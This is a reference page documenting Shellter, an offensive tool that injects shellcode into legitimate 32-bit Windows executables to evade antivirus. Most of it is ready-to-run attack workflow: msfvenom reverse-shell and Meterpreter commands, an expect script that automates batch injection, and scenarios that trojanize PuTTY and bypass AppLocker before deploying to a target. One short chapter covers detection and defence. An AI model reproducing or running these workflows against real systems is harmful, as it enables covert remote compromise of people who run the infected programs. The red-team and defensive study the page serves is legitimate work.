---
title: "Shellter"
tool_name: "shellter"
category: "Shellcode & Payload"
phase: "02 - Resource Development"
difficulty: "Intermediate"
platform: "Linux (targets Windows)"
language: "C, Assembly"
license: "Proprietary"
repository: "https://www.shellterproject.com/"
kali_package: "shellter"
mitre_attack:
  tactic: "resource-development"
  technique_id: "TA0042"
  technique_name: "Resource Development"
  sub_technique: "shellcode_payload"
tags:
  - "shellcode-injection"
  - "pe-infection"
  - "av-evasion"
date_created: "2011-01-01"
last_updated: "2024-01-01"
author: "NTGhost"
---

# Shellter — Comprehensive Documentation

---

## Chapter 1: Introduction & Overview

Shellter is a dynamic shellcode injection tool — the most effective PE infector available for defense evasion. Unlike traditional PE infectors that add suspicious new sections with RWX permissions, Shellter leverages the original structure of the PE file to inject shellcode into existing code paths, making the infected binary nearly indistinguishable from the original.

### How Shellter Works

1. **Analysis phase**: Shellter examines the target PE file, identifies valid execution paths and code caves.
2. **Injection phase**: The original instructions at a chosen execution point are replaced with a jump to the shellcode, which is placed in an existing code section.
3. **Recovery stub**: After the shellcode executes, a stub restores the original CPU state and jumps back to the next instruction in the original execution path.

This approach avoids common AV detection heuristics:
- No new RWX sections added
- No import table modifications
- Original PE structure preserved
- Code executes from existing sections with proper permissions

### Limitations

- **32-bit only**: Shellter targets Windows 32-bit PE files exclusively.
- **Wine dependency**: Runs under WINE on Linux systems.
- **Not universal**: Some executables have built-in protections that prevent injection.
- **Single-infection**: Each binary can only be infected once reliably.

### Relationship to MSFvenom

Shellter is designed to work with MSFvenom's raw output. The workflow:

```
MSFvenom (generate shellcode) → Shellter (inject into PE)
```

---

## Chapter 2: Installation & Setup

### Kali Linux Installation

```bash
sudo apt update && sudo apt install shellter
```

**Explanation:** Installs Shellter from the Kali repository. Requires WINE for Windows PE processing.

### WINE Setup (Required)

Shellter processes Windows PE files through WINE. Install 32-bit WINE support:

```bash
sudo dpkg --add-architecture i386
sudo apt update
sudo apt -y install wine32
```

**Explanation:** Adds i386 architecture to the package manager and installs 32-bit WINE, required by Shellter to execute and analyze 32-bit Windows binaries.

### Verify Installation

```bash
shellter -h
```

Expected output:

```
┏━(Message from Kali developers)
┃
┃ You may need to install the wine32 package first:
┃  # dpkg --add-architecture i386 && apt update && apt -y install wine32
┃
┗━
```

**Practical caveat:** If you see the above message, WINE is not properly configured. Ensure both `i386` architecture and `wine32` are installed.

---

## Chapter 3: Basic Usage

### Interactive Mode

Shellter operates in an interactive mode. Launch it and follow prompts:

```bash
shellter
```

**Explanation:** Starts Shellter in interactive mode, prompting for target PE selection and injection options.

### Workflow Overview

1. **Select target**: Provide path to a legitimate 32-bit Windows PE file
2. **Choose mode**: Stealth (auto) or Manual (custom shellcode)
3. **Provide shellcode**: Feed raw MSFvenom output
4. **Select injection point**: Choose from discovered code caves
5. **Get output**: Infected PE saved alongside the original

### Complete Usage Steps

```bash
# Step 1: Generate raw shellcode with MSFvenom
msfvenom -p windows/meterpreter/reverse_tcp \
  LHOST=192.168.1.100 \
  LPORT=4444 \
  -f raw \
  -o /tmp/shellcode.bin

# Step 2: Launch Shellter
shellter

# Interactive prompts:
# [A] Attach to process → [N] for new PE
# PE Target: /path/to/legitimate.exe
# [S]tealth mode
# Payload Source: [L]ocal file
# Shellcode file: /tmp/shellcode.bin
# Select injection point from available options
```

**Explanation:** MSFvenom generates raw shellcode, then Shellter injects it into a legitimate PE file through its interactive interface.

### Stealth Mode vs Performance Mode

| Mode | Description | Best For |
|------|-------------|----------|
| **Stealth (S)** | Analyzes execution paths deeply, finds optimal injection points | Production red team, AV evasion |
| **Performance (P)** | Faster analysis, less thorough path selection | Testing, CTF, rapid iteration |

```bash
# In Shellter interactive mode, choose:
# [S] Stealth Mode — recommended for all engagements
```

**Explanation:** Stealth mode performs deeper binary analysis to find injection points that preserve normal execution flow.

### Generating Compatible Shellcode

```bash
# Recommended: raw format for maximum compatibility
msfvenom -p windows/meterpreter/reverse_tcp \
  LHOST=192.168.1.100 \
  LPORT=4444 \
  -f raw \
  -o shellcode.bin

# Verify shellcode size
wc -c shellcode.bin
```

**Explanation:** Raw format produces the cleanest shellcode without format wrappers, ideal for Shellter injection.

---

## Chapter 4: Intermediate Usage

### Automation with Bash Scripts

```bash
#!/bin/bash
# Semi-automated Shellter injection

TARGET="$1"
LHOST="192.168.1.100"
LPORT="4444"

if [ -z "$TARGET" ]; then
    echo "Usage: $0 <target.exe>"
    exit 1
fi

# Generate raw shellcode
msfvenom -p windows/meterpreter/reverse_tcp \
    LHOST="$LHOST" LPORT="$LPORT" \
    -f raw -o /tmp/shellcode.bin

# Use expect for interactive Shellter
expect << EOF
spawn shellter
expect "Select:" { send "N\r" }
expect "PE Target:" { send "$TARGET\r" }
expect "Select:" { send "S\r" }
expect "Select:" { send "L\r" }
expect "Shellcode file:" { send "/tmp/shellcode.bin\r" }
expect eof
EOF
```

**Explanation:** Uses `expect` to automate Shellter's interactive prompts, enabling scripted batch injection of multiple targets.

### MSFvenom → Shellter Pipeline

```bash
# Generate multiple shellcode variants and inject into different PEs
for port in 4444 4445 4446; do
    msfvenom -p windows/shell_reverse_tcp \
        LHOST=192.168.1.100 LPORT=$port \
        -f raw -o /tmp/shell_${port}.bin
done

# Feed each to Shellter interactively
echo "[*] Inject shell_4444.bin into target1.exe"
echo "[*] Inject shell_4445.bin into target2.exe"
echo "[*] Inject shell_4446.bin into target3.exe"
```

**Explanation:** Generates unique shellcode per target, then injects each into a different PE for multi-target engagements.

### Preserving Original Files

Shellter creates backup copies automatically. The original PE is preserved as `original.exe.bak` (or similar suffix). Always verify:

```bash
# Check file sizes
ls -la target.exe target.exe.bak

# Verify the original still works
wine target.exe.bak
```

**Explanation:** Always verify the original PE remains functional after injection. Shellter preserves backups, but manual verification prevents deployment of corrupted files.

---

## Chapter 5: Advanced Usage

### Custom Shellcode Integration

Shellter accepts any raw shellcode — not just MSFvenom output. Use shellcode from:

- **Custom exploit development**: Hand-crafted shellcode for specific targets
- **Shell-storm database**: Community-contributed shellcode
- **Cymothoa**: Process injection payloads
- **Veil-Ordnance**: Encoded shellcode variants

```bash
# Example: inject custom shellcode from shell-storm
# ID 837 - Linux x86 execve /bin/sh (21 bytes)
wget http://shell-storm.org/api/shellcode/?id=837 -O custom.bin

# Shellter will inject any valid x86 raw shellcode into 32-bit Windows PEs
```

**Explanation:** Shellter is format-agnostic — it injects any raw binary payload, making it a versatile delivery mechanism for custom shellcode.

### DLL Injection

Shellter can inject shellcode into DLL files, not just EXEs:

```bash
# Infect a DLL that will be loaded by a legitimate application
shellter
# Select: N (new PE)
# Target: /path/to/legitimate.dll
# Mode: Stealth
# Shellcode: /tmp/shellcode.bin
```

**Explanation:** DLL injection targets applications that load external libraries, achieving code execution through DLL hijacking or side-loading.

### AV Evasion Deep Dive

Shellter's evasion effectiveness stems from:

1. **No structural PE modifications**: Existing sections are used; no new sections added
2. **Code cave utilization**: Shellcode lives in legitimate code regions
3. **Execution flow preservation**: The original program runs normally after shellcode completes
4. **No import table changes**: API resolution is untouched
5. **Entropy normalization**: The infected region maintains natural entropy levels

**Detection resistance:** As of 2024, Shellter-infected binaries frequently bypass Windows Defender, Avast, AVG, Kaspersky, and many other AV products in their default configurations.

---

## Chapter 6: Real-World Scenarios

### Scenario 1: Red Team Binary Trojanning

A red team needed to deliver a payload to a target running enterprise AV. Standard MSFvenom executables were blocked immediately.

```bash
# Use a legitimate 32-bit utility as the host
# PuTTY is a common choice — small, trusted, 32-bit
wget https://the.earth.li/~sgtatham/putty/latest/w32/putty.exe -O putty.exe

# Generate shellcode
msfvenom -p windows/meterpreter/reverse_tcp \
    LHOST=192.168.1.100 LPORT=443 \
    -f raw -o /tmp/shell.bin

# Inject with Shellter (interactive)
shellter
# Target: putty.exe
# Mode: Stealth
# Shellcode: /tmp/shell.bin
```

**Explanation:** The trojanized PuTTY opens normally (functioning as a real SSH client) while silently establishing a Meterpreter session. The 32-bit requirement limits targeting to WoW64 environments, but this is offset by the high evasion success rate.

### Scenario 2: CTF — Bypassing Antivirus on a Cracking Challenge

A CTF challenge provided a password-protected ZIP file containing a binary that needed to be analyzed. The binary was flagged by AV, preventing download to the analysis VM.

```bash
# Create a clean wrapper PE
cp /usr/share/windows-resources/binaries/rar.exe wrapper.exe

# Generate minimal shellcode
msfvenom -p windows/exec CMD="calc.exe" \
    -f raw -o /tmp/calc.bin

# Infect the wrapper
shellter
# Target: wrapper.exe
# Mode: Performance
# Shellcode: /tmp/calc.bin

# Upload the infected wrapper (passes AV check)
# The wrapper runs calc.exe (non-malicious proof of concept)
```

**Explanation:** In CTF scenarios, Shellter can be used to create proof-of-concept infections that demonstrate the technique without deploying actual malware.

### Scenario 3: Internal Pentest — Bypassing Application Whitelisting

The target environment used Windows AppLocker, but allowed unsigned executables from specific directories. A known-good 32-bit application existed in an allowed path.

```bash
# Identify allowed executables (from enumeration)
# Found: C:\Tools\legit.exe (signed, 32-bit, whitelisted)

# Generate stageless shellcode (more reliable than staged)
msfvenom -p windows/meterpreter_reverse_tcp \
    LHOST=10.0.0.50 LPORT=443 \
    -f raw -o /tmp/shell.bin

# Infect the whitelisted executable
shellter
# Target: legit.exe
# Mode: Stealth
# Shellcode: /tmp/shell.bin

# Replace the original on the target
# AppLocker allows execution; payload executes silently
```

**Explanation:** Combining Shellter with whitelisting bypass achieves code execution in environments where unsigned executables are blocked by policy.

---

## Chapter 7: Detection & Defense

### PE Anomaly Detection

Defensive tools that detect Shellter infections:

- **PE-sieve**: Scans for injected code in running processes and on-disk PEs
- **Hollows Hunter**: Detects process hollowing and injection
- **PEiD**: Identifies packers and cryptors used by infection tools
- **YARA rules**: Signature-based detection of known Shellter patterns

### Behavioral Indicators

- Unexpected network connections from known-good applications
- Parent-child process anomalies (legitimate apps spawning `cmd.exe` or `powershell.exe`)
- Memory regions with RWX permissions in unexpected modules
- Application crashes due to corrupted code paths

### Memory Analysis

```bash
# Volatility framework - detect injected processes
volatility -f memory.dump --profile=Win7SP1x64 malfind

# Look for processes with VAD entries showing:
# Protection: PAGE_EXECUTE_READWRITE
# Memory range not backed by a file on disk
```

**Explanation:** Memory forensics reveals injected shellcode by identifying executable memory regions that lack corresponding file backing.

### Preventive Measures

1. **Application whitelisting**: Only allow signed, approved executables
2. **Code signing enforcement**: Require valid signatures for all executables
3. **Behavioral monitoring**: Deploy EDR with memory scanning capabilities
4. **Network segmentation**: Limit outbound connections from workstations
5. **Regular integrity checks**: Hash-monitor known-good executables

---

## Chapter 8: Troubleshooting

### "Application could not be started" Error

**Cause:** WINE is not properly configured.

```bash
sudo dpkg --add-architecture i386
sudo apt update && sudo apt -y install wine32
```

**Explanation:** Shellter requires 32-bit WINE to process Windows PE files. This error indicates the i386 WINE runtime is missing.

### "PE not supported" Error

**Cause:** The target PE has protections that prevent injection (NSIS installers, UPX-packed binaries with specific configurations, or 64-bit executables).

```bash
# Verify target is 32-bit
file target.exe

# If 64-bit, find a 32-bit alternative
# PE files with bound imports are also unsupported
```

**Explanation:** Shellter only works with native 32-bit Windows PE files. 64-bit executables and certain protected binaries cannot be infected.

### Shellcode Doesn't Execute

**Cause:** The injection point corrupted the original execution flow, or the shellcode contains platform-specific assumptions.

```bash
# Use a simpler, more reliable shellcode
msfvenom -p windows/shell_reverse_tcp \
    LHOST=192.168.1.100 LPORT=4444 \
    -f raw -o shellcode.bin

# Try a different injection point in Shellter
# Some code caves work better than others
```

**Explanation:** Not all injection points are equally reliable. If the first choice fails, Shellter provides multiple options — try the next available code cave.

### Infected Binary Crashes

**Cause:** The injection point disrupts a critical code path.

```bash
# Use Shellter's Stealth mode for safer injection point selection
# Or try a different target PE — some binaries work better than others
```

**Explanation:** Shellter's Stealth mode analyzes execution paths more thoroughly, reducing the likelihood of corrupting critical code. If crashes persist, switch to a different host executable.

---

## Shellcode Injection Reference

### How Injection Points Work

When Shellter analyzes a PE file, it identifies execution paths — sequences of instructions that the processor follows during normal execution. Within these paths, it locates code caves: sequences of null bytes or unused instructions that can safely hold shellcode.

The injection process:

1. **Entry point redirect**: The first instruction at the entry point is replaced with a jump to the shellcode location.
2. **Shellcode placement**: The payload bytes are written into the selected code cave.
3. **Recovery stub**: After shellcode execution, a stub restores registers and jumps back to the original next instruction.
4. **Execution resumes**: The program continues normally — the user sees no difference.

### Choosing Injection Points

Shellter presents multiple injection options. The choice depends on:

- **Cave size**: Must accommodate the shellcode + recovery stub
- **Cave location**: Code caves in `.text` or `.rdata` sections are safer than `.data`
- **Execution frequency**: Rarely executed paths are less likely to cause visible side effects
- **Register preservation**: The recovery stub must preserve all registers the original code expected

### Understanding Stealth Mode

Stealth mode performs deeper analysis than Performance mode:

- Traces multiple execution paths from the entry point
- Evaluates the impact of each potential injection point
- Checks for stack frame integrity
- Verifies register state preservation
- Tests the infection by running a small test execution under WINE

This thorough analysis reduces the chance of creating a corrupted binary but takes significantly longer — sometimes minutes for complex executables.

### PE Structure Considerations

Shellter respects the PE format structure:

- **No new sections added**: Unlike crude infectors, Shellter uses existing sections
- **Section permissions preserved**: No changes to `IMAGE_SCN_MEM_EXECUTE` flags
- **Import table untouched**: API resolution works normally
- **Resource section intact**: Dialogs, icons, and strings remain functional
- **Certificate table cleared**: This is the only structural change — the binary becomes unsigned

The certificate table clearing is notable. When BDF or Shellter infect a binary, the PE certificate pointer is zeroed. This removes code signing, which some AV products use as a trust signal. A binary that was previously signed by a trusted vendor becomes unsigned after infection.

---

## Resources

### Official Documentation

- [Shellter Project](https://www.shellterproject.com/) — Official website and documentation
- [Shellter User Guide](https://www.shellterproject.com/UsingSh.html) — Detailed usage guide
- [Kali Linux Shellter Page](https://www.kali.org/tools/shellter/) — Kali package information

### Related Tools

- [Metasploit Framework](https://www.metasploit.com/) — Payload generation
- [PE-sieve](https://github.com/hasherezade/pe-sieve) — PE infection detection
- [Hollows Hunter](https://github.com/hasherezade/hollows_hunter) — Process injection detection

### Learning Resources

- [OffSec PEN-200](https://www.offsec.com/courses/pen-200/) — Course covering antivirus evasion
- [Practical Malware Analysis](https://nostarch.com/malware) — PE structure fundamentals
- [Shellcode Development](https://www.corelan.be/index.php/2010/06/16/exploit-writing-tutorial-part-3-structured-exception-handling-seh/) — Shellcode injection techniques
- [PE Format Specification](https://learn.microsoft.com/en-us/windows/win32/debug/pe-format) — Microsoft PE documentation

### Shellter Version History

| Version | Date | Key Changes |
|---------|------|-------------|
| 6.0 | 2018 | Major rewrite, improved code analysis |
| 6.5 | 2020 | Additional shellcode support |
| 7.0 | 2022 | Performance improvements |
| 7.2 | 2024 | Current Kali release |

### Integration with MSFvenom Workflow

The complete workflow for a red team payload delivery:

```bash
# Step 1: Identify a suitable 32-bit Windows PE on the target
# Common choices: putty.exe, psexec.exe, rar.exe, or legitimate admin tools

# Step 2: Generate raw shellcode
msfvenom -p windows/meterpreter/reverse_tcp \
  LHOST=192.168.1.100 LPORT=443 \
  -f raw \
  -e x86/shikata_ga_nai \
  -i 3 \
  -b '\x00' \
  -o /tmp/stage1.bin

# Step 3: Size check
wc -c /tmp/stage1.bin
# Must fit within available code caves (typically 200-600 bytes)

# Step 4: Inject with Shellter
shellter
# Follow interactive prompts

# Step 5: Verify the infected binary
# Test in a safe environment first
wine infected_target.exe

# Step 6: Deploy to the target
```

### Why 32-bit Only?

Shellter's 32-bit limitation stems from several technical factors:

1. **PE32 structure**: The code cave analysis relies on 32-bit PE parsing
2. **WINE compatibility**: Shellter runs under 32-bit WINE for PE execution
3. **Instruction encoding**: 32-bit instructions have simpler encoding patterns
4. **Code path analysis**: The execution path tracing is optimized for x86

For 64-bit payloads, combine MSFvenom's 64-bit shellcode with alternative injection tools or use Veil/Donut for modern evasion.

---

*Last updated: July 2026*
